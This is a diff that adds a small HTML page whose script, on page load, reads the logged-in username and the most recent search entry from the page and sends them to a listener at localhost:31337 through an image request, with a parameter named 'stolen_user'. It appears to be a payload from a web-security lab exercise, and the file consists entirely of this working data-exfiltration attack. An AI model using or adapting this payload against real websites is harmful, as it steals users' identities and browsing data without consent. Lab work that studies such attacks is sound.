@@ -1,0 +1,16 @@
+<!DOCTYPE html>
+<html>
+<body>
+  <script>
+    document.addEventListener('DOMContentLoaded', function() {
+      var username = document.getElementById("logged-in-user").innerText;
+      var recentHistory = document.getElementsByClassName("list-group")[0];
+      var children_nodes = recentHistory.childNodes;
+      var search = children_nodes[3].innerText;
+      var url = 'http://localhost:31337/?stolen_user=' + encodeURIComponent(username) + '&last_search=' + encodeURIComponent(search);
+      var img = new Image();
+      img.src = url;
+    });
+  </script>
+</body>
+</html>
